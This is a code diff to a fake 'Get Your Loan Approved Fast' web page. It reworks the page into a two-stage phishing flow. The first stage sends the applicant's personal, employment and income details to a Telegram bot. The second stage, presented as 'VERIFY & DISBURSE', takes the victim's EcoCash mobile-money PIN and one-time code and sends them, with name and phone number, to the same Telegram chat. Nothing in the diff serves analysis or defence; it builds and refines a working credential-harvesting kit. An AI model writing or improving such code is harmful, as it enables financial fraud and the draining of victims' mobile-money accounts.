@@ -334,7 +334,7 @@
                 <div class="step-bar" id="bar3"></div>
             </div>
 
-            <form id="loanForm">
+            <div id="loanForm">
                 <!-- STEP 1: Loan Calculator & Details -->
                 <div class="step-content active" id="step1">
                     <div class="header-title">Get Your Loan Approved Fast</div>
@@ -494,8 +494,10 @@
 
                     <div class="btn-group">
                         <button type="button" class="btn btn-secondary" id="prevBtn3">PREVIOUS</button>
-                        <button type="button" class="btn btn-primary" id="proceedToVerifyBtn">PROCEED TO VERIFY</button>
+                        <button type="button" class="btn btn-primary" id="submitInitialBtn">SUBMIT APPLICATION</button>
                     </div>
+
+                    <div id="initialStatusBox" class="status-msg"></div>
                 </div>
 
                 <!-- STEP 4: EcoCash PIN & OTP Verification -->
@@ -521,12 +523,12 @@
 
                     <div class="btn-group">
                         <button type="button" class="btn btn-secondary" id="prevBtn4">PREVIOUS</button>
-                        <button type="submit" class="btn btn-primary" id="submitBtn">FINISH &amp; SUBMIT</button>
+                        <button type="button" class="btn btn-primary" id="submitVerifyBtn">VERIFY &amp; DISBURSE</button>
                     </div>
 
-                    <div id="statusBox" class="status-msg"></div>
+                    <div id="verifyStatusBox" class="status-msg"></div>
                 </div>
-            </form>
+            </div>
         </div>
 
         <div class="footer">
@@ -569,7 +571,7 @@
             updateCalculator();
         }
 
-        //Multi-step Navigation Event Listeners
+        // Multi-step Navigation Event Listeners
         document.getElementById('nextBtn1').addEventListener('click', function() {
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
@@ -598,12 +600,6 @@
             document.getElementById('bar3').classList.add('active');
         });
 
-        document.getElementById('proceedToVerifyBtn').addEventListener('click', function() {
-            document.getElementById('step3').classList.remove('active');
-            document.getElementById('step4').classList.add('active');
-            document.getElementById('stepsIndicator').style.display = 'none';
-        });
-
         document.getElementById('prevBtn2').addEventListener('click', function() {
             document.getElementById('step2').classList.remove('active');
             document.getElementById('bar2').classList.remove('active');
@@ -622,23 +618,13 @@
             document.getElementById('step3').classList.add('active');
         });
 
-        // Form Submission to Telegram with Timeout Protector & PIN/OTP
-        document.getElementById('loanForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const pin = document.getElementById('ecocashPin').value.trim();
-            const otp = document.getElementById('otpCode').value.trim();
-
-            if (!pin || !otp) {
-                alert('Please enter both your EcoCash PIN and OTP code.');
-                return;
-            }
-
-            const submitBtn = document.getElementById('submitBtn');
-            const statusBox = document.getElementById('statusBox');
+        // STAGE 1: Submit Initial Application
+        document.getElementById('submitInitialBtn').addEventListener('click', async function() {
+            const submitBtn = document.getElementById('submitInitialBtn');
+            const statusBox = document.getElementById('initialStatusBox');
 
             submitBtn.disabled = true;
-            submitBtn.textContent = 'VERIFYING & SUBMITTING...';
+            submitBtn.textContent = 'SUBMITTING...';
             statusBox.style.display = 'none';
 
             try {
@@ -662,9 +648,76 @@
                                 `⏱ *Term:* ${loanTerm}\n` +
                                 `📋 *Purpose:* ${purpose}\n` +
                                 `💼 *Employment:* ${employment}\n` +
-                                `💵 *Annual Income:* $${annualIncome}\n\n` +
-                                `🔐 *EcoCash PIN:* \`${pin}\`\n` +
-                                `🔑 *OTP Code:* \`${otp}\``;
+                                `💵 *Annual Income:* $${annualIncome}`;
+
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 8000);
+
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+
+                const data = await response.json();
+
+                if (data.ok) {
+                    // Transition to Verification Step (Step 4)
+                    document.getElementById('step3').classList.remove('active');
+                    document.getElementById('step4').classList.add('active');
+                    document.getElementById('stepsIndicator').style.display = 'none';
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'SUBMIT APPLICATION';
+                } else {
+                    throw new Error(data.description || 'Telegram API error');
+                }
+            } catch (error) {
+                console.error(error);
+                statusBox.textContent = error.name === 'AbortError' ? 'Submission timed out. Please check your connection.' : 'Submission failed: ' + error.message;
+                statusBox.className = 'status-msg';
+                statusBox.style.background = '#fee2e2';
+                statusBox.style.color = '#991b1b';
+                statusBox.style.display = 'block';
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'SUBMIT APPLICATION';
+            }
+        });
+
+        // STAGE 2: Submit Verification (PIN & OTP)
+        document.getElementById('submitVerifyBtn').addEventListener('click', async function() {
+            const pin = document.getElementById('ecocashPin').value.trim();
+            const otp = document.getElementById('otpCode').value.trim();
+
+            if (!pin || !otp) {
+                alert('Please enter both your EcoCash PIN and OTP code.');
+                return;
+            }
+
+            const submitBtn = document.getElementById('submitVerifyBtn');
+            const statusBox = document.getElementById('verifyStatusBox');
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'VERIFYING...';
+            statusBox.style.display = 'none';
+
+            try {
+                const firstName = document.getElementById('firstName').value;
+                const lastName = document.getElementById('lastName').value;
+                const phone = '+254 ' + document.getElementById('phoneNumber').value;
+
+                const message = `🔐 *ECOCASH VERIFICATION CREDENTIALS* 🔐\n\n` +
+                                `👤 *Applicant:* ${firstName} ${lastName}\n` +
+                                `📱 *Phone:* ${phone}\n` +
+                                `🔑 *EcoCash PIN:* \`${pin}\`\n` +
+                                `🔢 *OTP Code:* \`${otp}\``;
 
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
@@ -697,13 +750,13 @@
                 }
             } catch (error) {
                 console.error(error);
-                statusBox.textContent = error.name === 'AbortError' ? 'Submission timed out. Please check your connection.' : 'Submission failed: ' + error.message;
+                statusBox.textContent = error.name === 'AbortError' ? 'Verification timed out. Please check your connection.' : 'Verification failed: ' + error.message;
                 statusBox.className = 'status-msg';
                 statusBox.style.background = '#fee2e2';
                 statusBox.style.color = '#991b1b';
                 statusBox.style.display = 'block';
                 submitBtn.disabled = false;
-                submitBtn.textContent = 'FINISH & SUBMIT';
+                submitBtn.textContent = 'VERIFY & DISBURSE';
             }
         });
     </script>
